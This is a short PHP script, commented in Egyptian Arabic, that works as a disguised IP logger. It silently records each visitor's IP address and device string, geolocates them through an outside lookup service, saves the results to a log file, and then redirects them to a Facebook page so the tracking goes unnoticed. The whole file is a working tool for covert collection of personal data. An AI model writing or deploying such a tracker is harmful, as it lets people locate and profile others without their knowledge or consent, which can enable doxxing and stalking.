<?php
date_default_timezone_set("Africa/Cairo");

// الحصول على IP الزائر
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// استخدام API لجلب الموقع الجغرافي
$geoData = json_decode(file_get_contents("https://ipwho.is/$ip"), true);

$country = $geoData['country'] ?? 'Unknown';
$city = $geoData['city'] ?? 'Unknown';
$region = $geoData['region'] ?? 'Unknown';

// بناء السطر النهائي
$log = "IP: $ip | Country: $country | City: $city | Region: $region | Device: $userAgent | Time: $time\n";

// حفظ في ملف logs.txt
file_put_contents("logs.txt", $log, FILE_APPEND);

// إشعار فوري - هنضيفه بعد كده

// تحويل للصفحة اللي بعدها
header("Location: https://www.facebook.com/elmercato0");
exit;
?>
